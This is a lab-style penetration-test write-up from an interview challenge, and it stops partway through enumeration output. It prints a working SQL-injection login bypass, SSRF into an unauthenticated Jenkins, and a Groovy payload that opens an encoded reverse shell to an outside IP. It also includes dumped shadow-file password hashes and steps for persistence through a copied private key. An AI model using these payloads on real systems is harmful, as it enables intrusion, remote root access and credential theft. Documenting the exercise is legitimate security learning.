# Spain Penetration tester Interview Write-up
## [+] Preliminary 
This topic is not meant to be guide to be followed in order to attend penetration testing interviews specially in spain. But it was my experince in that matter.
I had this challenge at the first phase and after solving it I had decided to share it publicly. <br>
To be honest, I have one reason to share it, this machine it was the most real challenge that I faced. I mean by real challenge it had realistic scenario you may find while you carry out any penetration testing activity. <br>
Note: I am going to mask information that could disclose the company idenitity, Hope I won't miss one of them :D God help me in that.

## [+] Machine Information:
- Hackthebox challenge link: N/A, Sorry for that :/ (Let me tell you a secret, Come closer! may be one day I will share another one had the same scenario with special flavor)
- The challenge discription: you are going to carry out a penetration testing activity against one of pigeon company's asset/host, you just have 1 day to complete this activity. Its simple.
- What is your goal? </br>
  - Gain Root access.
  - Dycrpt Mr. Scott's primary account number for his payment card.
Note: The pigeon company allowed you to join the its internal network and the same target vlan. Your IP: 192.168.1.11/24, Target IP: 192.168.1.4/24 <br>

Lets break it down! hehehe!!!

## [+] Walkthrough:
1. As a first step, we using nmap to identify the OS, open ports, service could be used by the target and run a nmap vulnerability scan scripts.
```
# Nmap 7.91 scan initiated Sun Jul 18 04:47:03 2021 as: nmap -sS -A --script vuln -oA 003-target-scan.result 192.168.1.4
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.1.4
Host is up (0.00046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 (protocol 2.0; HPN-SSH patch 14v4)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	EDB-ID:21018	10.0	https://vulners.com/exploitdb/EDB-ID:21018	*EXPLOIT*
|     	CVE-2001-0554	10.0	https://vulners.com/cve/CVE-2001-0554
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963	*EXPLOIT*
|     	EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	CVE-2007-2768	4.3	https://vulners.com/cve/CVE-2007-2768
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|     	EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	EDB-ID:40136	0.0	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	0.0	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	EDB-ID:39569	0.0	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	1337DAY-ID-32009	0.0	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
|_    	1337DAY-ID-10010	0.0	https://vulners.com/zdt/1337DAY-ID-10010	*EXPLOIT*
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
10080/tcp open  http   amanda.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:62:8B:E9 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.1.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 18 04:56:16 2021 -- 1 IP address (1 host up) scanned in 553.56 seconds

```

Okay! I have to analysis the nmap result, and I have to remind myself there is a goal I have to achieve it. There is no need to consume time for doing shit staff that not 
allows me to reach the machine's objective like DOS attack or even avoiding the bruteforcing because it could be rabbit hole. I decided to try it if I couldn't to get my initial access.

2. Enumerate users through ssh service, It seems to be a great idea! I suceeded to find "root" user, only! Okey! Okey!
3. Trying the top common password against root account, with no success! Expected. Fine! Albertoooo what are you doin'? It has to be more difficult than your thoughts :D

There is no more choice except http services that run on port 80,10080.

As usual, I decided to start with the wrong port :D. My choice was port 80. when I am just browsing it, I recieved 404! Really!! are you kidding me O.o! <br>

5. Wow! it wont be easy task, content discovery my last hope. I used gobuster along with big.txt wordlist. 
```
http://192.168.1.4/encrypt              (Status: 400) [Size: 26]
http://192.168.1.4/users                (Status: 400) [Size: 26]
```
![Content Discovery Port 80](https://github.com/bassammaged/Random-machines/blob/main/images/content-discovery.png)

Finally!!!!, Good point to start! my word to myself don't rush! it will be more rabbit hole as usual! as I expected "400 error code with Missing required parameter"

6. Based on the response, I just used Arjun, wfuzz, parameth tools to try to figure out which parameter I could use! you know what I failed :D were you expecting something else! Ok I am quit, Bye!
7. My last hope was http service that runs on 10080 port. Ooooof! Start with content discovery and I find a login portal.
```
http://192.168.1.4:10080/login                (Status: 200) [Size: 1909]
http://192.168.1.4:10080/logout               (Status: 200) [Size: 1909]
```
![Content Discovery Port 10080](https://github.com/bassammaged/Random-machines/blob/main/images/content-discovery10080.png)

What's next? It was my question! trying default credentials, Hahaha nothing. If I was doin' my homework I was able to solve that :D
8. Why I didn't try SQL injection before, It seems to be a good evil option! 
9. 
  - Detect it when I just inject single qoute '
 ![Detect SQLi](https://github.com/bassammaged/Random-machines/blob/main/images/001-detection-error-based.png)

- Okey let's try to login with no credential, Boooom! I did it with the following payload 
```username'+OR+password=password--+-```

 ![Bypass authetnication through SQLi](https://github.com/bassammaged/Random-machines/blob/main/images/poc.png)
<br>
After Many of tries and tries and more of tries I logged in amanda system.

![POC](https://github.com/bassammaged/Random-machines/blob/main/images/poc-after-login.png)

</br></br>
 As I mentioned before, I am not going to focus to perform a full penetration testing to find all possible vulnerabilities/findings. I am focusing on how I could achieve the objectives.
 </br></br></br>
 There was a web hook function that allows me to perform http requests with limit possibility, but thanks god the developer didn't restrict where the request could be go :D "Evil laugh hehehe"
 <br>
 <p align="center">
    <img src="https://media.tumblr.com/1e1fcc8dc9fd6f7e99d7f00e1e62adb7/tumblr_inline_miwvvnj0XI1qz4rgp.gif">
 </p>
 

the following screenshots show I could preform SSRF with burp collaborator.
![detect SSRF](https://github.com/bassammaged/Random-machines/blob/main/images/detection.png)
![detect SSRF](https://github.com/bassammaged/Random-machines/blob/main/images/poc-1.png)
![detect SSRF](https://github.com/bassammaged/Random-machines/blob/main/images/poc-2.png)


9. There are many of scenario could be happened but why not give try to access jenkins service that run on 127.0.0.1:8080! Its good idea for you! for me too, Bro!
![Access restricted resource](https://github.com/bassammaged/Random-machines/blob/main/images/test.png) 

10. I succeed to access with no credential to jenkins! after digging a bit about jenkins and its ability,<strong>abusing script console function</strong> it was a good choice to
get reverse connection and the following payload that allows me get reverse shell with root privlidge.
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
Note: by changing the base64 payload and entering my IP and port, I got the reverse shell :D Finally as a root. <br><br>
![Reverse Shell POC](https://github.com/bassammaged/Random-machines/blob/main/images/reverse-shell-poc.png) 
![Reverse Shell POC](https://github.com/bassammaged/Random-machines/blob/main/images/revers-shell-poc2.png) 

11. After print which shell I am using ``` echo $SHELL ``` it was ``` /bin/ash ```, restricted shell! Agaaaain


<p align="center">
  <img src="https://media1.tenor.com/images/5d6cd0c6b0a0ae3c193e766fb8f1ed1f/tenor.gif">
</p>
12. Let me ask myself one question, Pleeeeeeeease! Am I root? Yes I am. So what! let's override /etc/passwd. I had changed it from /bin/ash to /bin/sh Boom It works. but you have to get the new shell.
<br> 
But before that, could I get persistence access? Yup It was so easy, Copy the priavte key of the user that already stored with insecure way :) From Here, I would like to thank the infrastructure engineer who store the private keys with inproper way, Thank you so much, Dear <3
<br>

![persistence access](https://github.com/bassammaged/Random-machines/blob/main/images/private-key.png) 
![persistence access](https://github.com/bassammaged/Random-machines/blob/main/images/access-poc.png) 

<p align="center">
  <img src="https://media1.tenor.com/images/938cd8a1f4ccd25d56a0ed3c1f91e9bf/tenor.gif">
</p>


Mmmmmmmmmmmmm! what now?! I achieved the first goal! Yuuuuupy but wait there is another objective :/ to decrypt the PAN of Scott's card.


13. I am just get LinEum.sh and start to investigate the outcomes, It was so interesting and I found two valuable information, the result of LinEum.sh:
```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.92

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Sun Jul 18 11:37:55 UTC 2021


### SYSTEM ##############################################
[-] Kernel information:
Linux aplab 4.1.20-0-grsec #1-Alpine SMP Mon Mar 21 15:49:51 GMT 2016 x86_64 Linux


[-] Kernel information (continued):
Linux version 4.1.20-0-grsec (buildozer@build-3-3-x86_64) (gcc version 5.3.0 (Alpine 5.3.0) ) #1-Alpine SMP Mon Mar 21 15:49:51 GMT 2016


[-] Specific release information:
3.3.3
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.3.3
PRETTY_NAME="Alpine Linux v3.3"
HOME_URL="http://alpinelinux.org"
BUG_REPORT_URL="http://bugs.alpinelinux.org"


[-] Hostname:
aplab


### USER/GROUP ##########################################
[-] Current user/group info:
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon),3(sys)
uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),2(daemon),4(adm)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys),4(adm),6(disk)
uid=4(lp) gid=7(lp) groups=7(lp),7(lp)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=7(halt) gid=0(root) groups=0(root)
uid=8(mail) gid=12(mail) groups=12(mail),12(mail)
uid=9(news) gid=13(news) groups=13(news),13(news)
uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
uid=11(operator) gid=0(root) groups=0(root)
uid=13(man) gid=15(man) groups=15(man),15(man)
uid=14(postmaster) gid=12(mail) groups=12(mail)
uid=16(cron) gid=16(cron) groups=16(cron),16(cron)
uid=21(ftp) gid=21(ftp) groups=21(ftp)
uid=22(sshd) gid=22(sshd) groups=22(sshd)
uid=25(at) gid=25(at) groups=25(at),25(at)
uid=31(squid) gid=31(squid) groups=31(squid),31(squid)
uid=33(xfs) gid=33(xfs) groups=33(xfs),33(xfs)
uid=35(games) gid=35(games) groups=35(games),100(users)
uid=70(postgres) gid=70(postgres) groups=70(postgres)
uid=84(nut) gid=84(nut) groups=84(nut)
uid=85(cyrus) gid=12(mail) groups=12(mail)
uid=89(vpopmail) gid=89(vpopmail) groups=89(vpopmail)
uid=123(ntp) gid=123(ntp) groups=123(ntp)
uid=209(smmsp) gid=209(smmsp) groups=209(smmsp),209(smmsp)
uid=405(guest) gid=100(users) groups=100(users)
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
uid=100(chrony) gid=1000(chrony) groups=1000(chrony),1000(chrony)
uid=1001(ops) gid=1001(ops) groups=1001(ops)


sh: gid=0(root): unknown operand
[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nut:x:84:84:nut:/var/state/nut:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:1000:Linux User,,,:/var/log/chrony:/sbin/nologin
ops:x:1001:1001:Linux User,,,:/home/ops:/bin/ash


[+] We can read the shadow file!
root:$6$5dH50ERJn9ULBcLG$HG6vA1CGDBCOqp1XTBCXJezRn1HoKZpV7WorxFCRerdRa6i6ICqgoUGCPZFcPQgGwam4D9TuHQCYpuVnCH45g/:16933:0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
nut:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
chrony:!:16933:0:99999:7:::
ops:$6$aY5XVqOd9ZiFQwil$Kg/Gk7ob5PtDBKxw3QqxVFP4LEhvXSSoqhUPJS7azNfNAICwFafw1.bPUbZ0JpJWJXW8DiPoSWBMUhdd8pPz8/:16934:0:99999:7:::


[-] Super user account(s):
root


[+] We can read root's home directory!
total 76
drwx------    5 root     root        4.0K Aug 28  2018 .
drwxr-xr-x   21 root     root        4.0K Jul 18 11:31 ..
-rw-------    1 root     root        3.5K Jul 18 11:37 .ash_history
-rw-------    1 root     root         358 Jul 18 11:03 .bash_history
drwxr-xr-x    2 root     root        4.0K May 12  2016 .oracle_jre_usage
drwx------    2 root     root        4.0K Aug 28  2018 .ssh
-rwxr-xr-x    1 root     root       46.0K Aug 28  2018 LinEnum.sh
drwxr-xr-x    3 root     root        4.0K May 12  2016 dockerfiles
-rw-r--r--    1 root     root           0 Aug 28  2018 foo


[-] Are permissions on /home directories lax:
total 12
drwxr-xr-x    3 root     root        4.0K May 13  2016 .
drwxr-xr-x   21 root     root        4.0K Jul 18 11:31 ..
drwxr-sr-x    2 ops      ops         4.0K May 13  2016 ops


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
USER=root
SSH_CLIENT=192.168.1.11 41936 22
MAIL=/var/mail/root
SHLVL=2
HOME=/root
SSH_TTY=/dev/pts/0
PAGER=less
PS1=\h:\w\$ 
LOGNAME=root
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SHELL=/bin/sh
PWD=/root
SSH_CONNECTION=192.168.1.11 41936 192.168.1.4 22
CHARSET=UTF-8


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


[-] Available shells:
# valid login shells
/bin/sh
/bin/ash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


### JOBS/TASKS ##########################################
[-] Cron jobs:
total 12
drwxr-xr-x    2 root     root          4096 May 12  2016 .
drwxr-xr-x   27 root     root          4096 May 13  2016 ..
-rw-------    1 root     root           283 Dec 14  2015 root


[-] Anything interesting in /var/spool/cron/crontabs:
lrwxrwxrwx    1 root     root            13 May 12  2016 /var/spool/cron/crontabs -> /etc/crontabs


[-] Jobs held by all users:
# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly


### NETWORKING  ##########################################
[-] Network and IP info:
docker0   Link encap:Ethernet  HWaddr 02:42:E6:46:D5:9A  
          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:e6ff:fe46:d59a%32744/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:271862 errors:0 dropped:0 overruns:0 frame:0
          TX packets:365403 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:36989297 (35.2 MiB)  TX bytes:45221008 (43.1 MiB)

eth0      Link encap:Ethernet  HWaddr 00:0C:29:62:8B:E9  
          inet addr:192.168.1.4  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe62:8be9%32744/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:510034 errors:0 dropped:0 overruns:0 frame:0
          TX packets:527961 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:67274329 (64.1 MiB)  TX bytes:308281014 (293.9 MiB)
          Interrupt:19 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1%32744/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:56 errors:0 dropped:0 overruns:0 frame:0
          TX packets:56 errors:0 dropped:0 overruns:0 carrier:0
